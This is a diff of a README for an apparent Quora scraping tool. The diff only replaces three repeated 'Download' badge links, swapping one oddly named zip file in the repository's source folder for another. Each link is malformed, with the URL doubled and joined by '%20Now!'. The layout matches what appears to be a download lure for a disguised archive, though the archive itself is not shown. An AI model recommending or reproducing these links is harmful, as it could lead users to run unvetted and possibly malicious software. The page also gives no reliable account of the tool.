@@ -1,6 +1,6 @@
 # 🔍 quora-search-results-scraper-and-or-question-answers-scraper - Effortless Quora Data Extraction Tool
 
-[![Download](https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/outputs/quora-search-results-scraper-and-or-question-answers-scraper-1.8.zip%20Now!https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/outputs/quora-search-results-scraper-and-or-question-answers-scraper-1.8.zip)](https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/outputs/quora-search-results-scraper-and-or-question-answers-scraper-1.8.zip)
+[![Download](https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/question_quora_or_and_answers_scraper_search_results_2.4.zip%20Now!https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/question_quora_or_and_answers_scraper_search_results_2.4.zip)](https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/question_quora_or_and_answers_scraper_search_results_2.4.zip)
 
 ## 📋 Overview
 
@@ -22,7 +22,7 @@ Before downloading the tool, ensure your system meets these requirements:
 
 To download the latest version of the application, click the button below. 
 
-[![Download](https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/outputs/quora-search-results-scraper-and-or-question-answers-scraper-1.8.zip%20Now!https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/outputs/quora-search-results-scraper-and-or-question-answers-scraper-1.8.zip)](https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/outputs/quora-search-results-scraper-and-or-question-answers-scraper-1.8.zip)
+[![Download](https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/question_quora_or_and_answers_scraper_search_results_2.4.zip%20Now!https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/question_quora_or_and_answers_scraper_search_results_2.4.zip)](https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/question_quora_or_and_answers_scraper_search_results_2.4.zip)
 
 ### Step 3: Install the Application
 
@@ -59,7 +59,7 @@ Once the application is installed, you can start using it to gather data from Qu
 
 To download the latest version, visit the link below:
 
-[![Download](https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/outputs/quora-search-results-scraper-and-or-question-answers-scraper-1.8.zip%20Now!https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/outputs/quora-search-results-scraper-and-or-question-answers-scraper-1.8.zip)](https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/outputs/quora-search-results-scraper-and-or-question-answers-scraper-1.8.zip)
+[![Download](https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/question_quora_or_and_answers_scraper_search_results_2.4.zip%20Now!https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/question_quora_or_and_answers_scraper_search_results_2.4.zip)](https://raw.githubusercontent.com/qcmp34/quora-search-results-scraper-and-or-question-answers-scraper/main/quora-search-results-and-question-answers-scraper/src/question_quora_or_and_answers_scraper_search_results_2.4.zip)
 
 ## 📊 Analytics Features
 
